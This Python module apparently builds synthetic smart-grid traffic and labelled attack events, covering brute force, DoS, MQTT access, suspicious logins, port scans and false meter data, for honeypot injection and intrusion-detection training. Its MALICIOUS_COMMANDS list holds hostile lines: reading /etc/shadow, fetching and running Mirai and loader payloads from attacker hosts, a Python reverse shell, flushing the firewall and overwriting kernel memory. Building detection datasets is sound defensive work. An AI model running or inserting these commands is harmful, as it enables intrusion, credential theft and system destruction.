"""
Traffic Generator Module
Generates realistic normal smart-grid network traffic and 6 distinct cyberattack scenarios:
- Normal Traffic
- Brute Force Attack
- Denial of Service (DoS)
- MQTT Unauthorized Access
- Suspicious Login
- Port Scanning
- Data Injection Attack

Supports both live injection into MQTT/honeypot and labeled dataset generation for ML training.
"""

import sys
import uuid
import random
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List, Optional

ROOT_DIR = Path(__file__).resolve().parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

import config
from simulation.smart_home import load_all_smart_homes
from simulation.mqtt_publisher import get_publisher

# Known IP Pools
EXTERNAL_ATTACKER_IPS = [
    "45.33.32.156", "185.220.101.5", "194.26.29.112",
    "218.92.0.187", "103.203.57.18", "198.51.100.42",
    "203.0.113.195", "185.196.220.34", "91.240.118.232"
]

GRID_INTERNAL_IPS = [f"192.168.1.{10 + i}" for i in range(10)]
SCADA_GATEWAY_IP = "192.168.1.1"

COMMON_USERNAMES = ["root", "admin", "scada", "operator", "griduser", "meter_admin", "support", "test"]
COMMON_PASSWORDS = ["123456", "password", "root", "admin123", "toor", "scada2024", "grid!pass", "qwerty"]
MALICIOUS_COMMANDS = [
    "cat /etc/shadow",
    "wget http://evil-c2.net/mirai.arm7 -O /tmp/m && chmod +x /tmp/m",
    "curl -s http://194.26.29.112/loader.sh | sh",
    "nmap -sS -p 1-1000 192.168.1.0/24",
    "iptables -F && iptables -X",
    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"45.33.32.156\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'",
    "dd if=/dev/urandom of=/dev/kmem bs=1024 count=100",
    "killall -9 mosquitto",
    "systemctl stop smartgrid-agent"
]

class SmartGridTrafficGenerator:
    def __init__(self):
        self.homes = load_all_smart_homes()
        self.publisher = get_publisher()

    def generate_event(self, attack_type: Optional[str] = None) -> Dict[str, Any]:
        """
        Generates a single network/security event matching the requested attack type,
        or randomly selects with realistic distribution if attack_type is None.
        """
        if attack_type is None:
            # 70% Normal Traffic, 30% Attack events across 6 attack classes
            if random.random() < 0.70:
                attack_type = "Normal Traffic"
            else:
                attack_type = random.choice([
                    "Brute Force Attack",
                    "Denial of Service (DoS)",
                    "MQTT Unauthorized Access",
                    "Suspicious Login",
                    "Port Scanning",
                    "Data Injection Attack"
                ])

        event_id = f"EVT_{uuid.uuid4().hex[:12].upper()}"
        home = random.choice(self.homes)
        reading = home.get_meter_reading()

        if attack_type == "Normal Traffic":
            return {
                "event_id": event_id,
                "home_id": home.home_id,
                "source_ip": home.ip_address,
                "destination_ip": SCADA_GATEWAY_IP,
                "source_port": random.randint(30000, 60000),
                "destination_port": 1883,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "event_type": "Normal Traffic",
                "login_attempts": 0,
                "failed_login_count": 0,
                "packet_size": random.randint(120, 280),
                "num_packets": 1,
                "connection_frequency": round(random.uniform(0.5, 1.2), 2),
                "traffic_rate_kbps": round(random.uniform(1.2, 4.5), 2),
                "network_protocol": "MQTT",
                "smart_meter_info": {
                    "voltage": reading["voltage"],
                    "current": reading["current"],
                    "power_kw": reading["power_kw"],
                    "is_tampered": False
                },
                "service_type": "MQTT",
                "command_entered": "",
                "login_success": False
            }

        elif attack_type == "Brute Force Attack":
            src_ip = random.choice(EXTERNAL_ATTACKER_IPS)
            attempts = random.randint(15, 60)
            return {
                "event_id": event_id,
                "home_id": home.home_id,
                "source_ip": src_ip,
                "destination_ip": SCADA_GATEWAY_IP,
                "source_port": random.randint(40000, 65000),
                "destination_port": random.choice([22, 2222, 2223]),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "event_type": "Brute Force Attack",
                "login_attempts": attempts,
                "failed_login_count": attempts - random.choice([0, 1]),
                "packet_size": random.randint(450, 950),
                "num_packets": attempts * 2,
                "connection_frequency": round(random.uniform(15.0, 45.0), 2),
                "traffic_rate_kbps": round(random.uniform(60.0, 150.0), 2),
                "network_protocol": "SSH",
                "smart_meter_info": {
                    "voltage": reading["voltage"],
                    "current": reading["current"],
                    "power_kw": reading["power_kw"],
                    "is_tampered": False
                },
                "service_type": "SSH",
                "username": random.choice(COMMON_USERNAMES),
                "password": random.choice(COMMON_PASSWORDS),
                "command_entered": "",
                "login_success": False
            }

        elif attack_type == "Denial of Service (DoS)":
            src_ip = random.choice(EXTERNAL_ATTACKER_IPS)
            num_packets = random.randint(500, 2500)
            return {
                "event_id": event_id,
                "home_id": home.home_id,
                "source_ip": src_ip,
                "destination_ip": SCADA_GATEWAY_IP,
                "source_port": random.randint(1024, 65535),
                "destination_port": 1883,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "event_type": "Denial of Service (DoS)",
                "login_attempts": 0,
                "failed_login_count": 0,
                "packet_size": random.randint(1200, 1500),
                "num_packets": num_packets,
                "connection_frequency": round(random.uniform(120.0, 500.0), 2),
                "traffic_rate_kbps": round(random.uniform(850.0, 3200.0), 2),
                "network_protocol": "TCP",
                "smart_meter_info": {
                    "voltage": reading["voltage"],
                    "current": reading["current"],
                    "power_kw": reading["power_kw"],
                    "is_tampered": False
                },
                "service_type": "MQTT",
                "command_entered": "",
                "login_success": False
            }

        elif attack_type == "MQTT Unauthorized Access":
            src_ip = random.choice(EXTERNAL_ATTACKER_IPS + ["192.168.1.250"])
            return {
                "event_id": event_id,
                "home_id": home.home_id,
                "source_ip": src_ip,
                "destination_ip": SCADA_GATEWAY_IP,
                "source_port": random.randint(30000, 55000),
                "destination_port": 1883,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "event_type": "MQTT Unauthorized Access",
                "login_attempts": random.randint(1, 4),
                "failed_login_count": random.randint(1, 3),
                "packet_size": random.randint(320, 750),
                "num_packets": random.randint(4, 15),
                "connection_frequency": round(random.uniform(3.0, 12.0), 2),
                "traffic_rate_kbps": round(random.uniform(15.0, 45.0), 2),
                "network_protocol": "MQTT",
                "smart_meter_info": {
                    "voltage": reading["voltage"],
                    "current": reading["current"],
                    "power_kw": reading["power_kw"],
                    "is_tampered": False
                },
                "service_type": "MQTT",
                "command_entered": "SUBSCRIBE # WITHOUT_AUTH",
                "login_success": False
            }

        elif attack_type == "Suspicious Login":
            src_ip = random.choice(EXTERNAL_ATTACKER_IPS)
            login_success = random.choice([True, False])
            cmd = random.choice(MALICIOUS_COMMANDS) if login_success else ""
            return {
                "event_id": event_id,
                "home_id": home.home_id,
                "source_ip": src_ip,
                "destination_ip": SCADA_GATEWAY_IP,
                "source_port": random.randint(35000, 60000),
                "destination_port": random.choice([22, 2222, 23, 2223]),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "event_type": "Suspicious Login",
                "login_attempts": random.randint(1, 3),
                "failed_login_count": 0 if login_success else 1,
                "packet_size": random.randint(280, 650),
                "num_packets": random.randint(3, 10),
                "connection_frequency": round(random.uniform(1.5, 6.0), 2),
                "traffic_rate_kbps": round(random.uniform(8.0, 30.0), 2),
                "network_protocol": "SSH" if random.random() < 0.7 else "TELNET",
                "smart_meter_info": {
                    "voltage": reading["voltage"],
                    "current": reading["current"],
                    "power_kw": reading["power_kw"],
                    "is_tampered": False
                },
                "service_type": "SSH",
                "username": random.choice(["root", "admin", "service"]),
                "password": random.choice(COMMON_PASSWORDS),
                "command_entered": cmd,
                "login_success": login_success
            }

        elif attack_type == "Port Scanning":
            src_ip = random.choice(EXTERNAL_ATTACKER_IPS)
            return {
                "event_id": event_id,
                "home_id": home.home_id,
                "source_ip": src_ip,
                "destination_ip": SCADA_GATEWAY_IP,
                "source_port": random.randint(45000, 65000),
                "destination_port": random.choice([21, 22, 23, 80, 443, 502, 1883, 8080, 2222]),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "event_type": "Port Scanning",
                "login_attempts": 0,
                "failed_login_count": 0,
                "packet_size": random.randint(40, 70),  # Tiny SYN/FIN scan packets
                "num_packets": random.randint(150, 800),
                "connection_frequency": round(random.uniform(40.0, 180.0), 2),
                "traffic_rate_kbps": round(random.uniform(25.0, 90.0), 2),
                "network_protocol": "TCP",
                "smart_meter_info": {
                    "voltage": reading["voltage"],
                    "current": reading["current"],
                    "power_kw": reading["power_kw"],
                    "is_tampered": False
                },
                "service_type": "SCAN",
                "command_entered": "",
                "login_success": False
            }

        elif attack_type == "Data Injection Attack":
            # Attacker falsifies meter readings (extreme voltage/current/negative power)
            src_ip = random.choice([home.ip_address, "192.168.1.199"])
            is_voltage_attack = random.random() < 0.5
            tampered_v = random.uniform(140.0, 170.0) if is_voltage_attack else random.uniform(285.0, 330.0)
            tampered_p = -random.uniform(5.0, 15.0) if not is_voltage_attack else round(reading["power_kw"] * 4.5, 3)

            return {
                "event_id": event_id,
                "home_id": home.home_id,
                "source_ip": src_ip,
                "destination_ip": SCADA_GATEWAY_IP,
                "source_port": random.randint(30000, 60000),
                "destination_port": 1883,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "event_type": "Data Injection Attack",
                "login_attempts": 0,
                "failed_login_count": 0,
                "packet_size": random.randint(220, 400),
                "num_packets": random.randint(2, 6),
                "connection_frequency": round(random.uniform(2.0, 8.0), 2),
                "traffic_rate_kbps": round(random.uniform(5.0, 20.0), 2),
                "network_protocol": "MQTT",
                "smart_meter_info": {
                    "voltage": round(tampered_v, 2),
                    "current": round(reading["current"] * 2.5, 2),
                    "power_kw": round(tampered_p, 3),
                    "is_tampered": True
                },
                "service_type": "MQTT",
                "command_entered": "INJECT_FALSE_METER_VALUES",
                "login_success": False
            }

        return {}

    def generate_training_dataset(self, num_samples: int = 3500) -> List[Dict[str, Any]]:
        """
        Generates balanced synthetic training dataset across all 7 attack classes
        specifically for Random Forest and Isolation Forest model training.
        """
        print(f"[*] Generating {num_samples} labeled network/security events for ML training...")
        dataset = []
        samples_per_class = num_samples // len(config.ATTACK_CATEGORIES)

        for category in config.ATTACK_CATEGORIES:
            for _ in range(samples_per_class):
                evt = self.generate_event(attack_type=category)
                dataset.append(evt)

        # Shuffle dataset
        random.shuffle(dataset)
        print(f"[OK] Training dataset generated with {len(dataset)} records.")
        return dataset

_traffic_gen = None

def get_traffic_generator() -> SmartGridTrafficGenerator:
    global _traffic_gen
    if _traffic_gen is None:
        _traffic_gen = SmartGridTrafficGenerator()
    return _traffic_gen

if __name__ == "__main__":
    gen = get_traffic_generator()
    sample_evt = gen.generate_event()
    print("[OK] Generated Sample Event:", sample_evt)

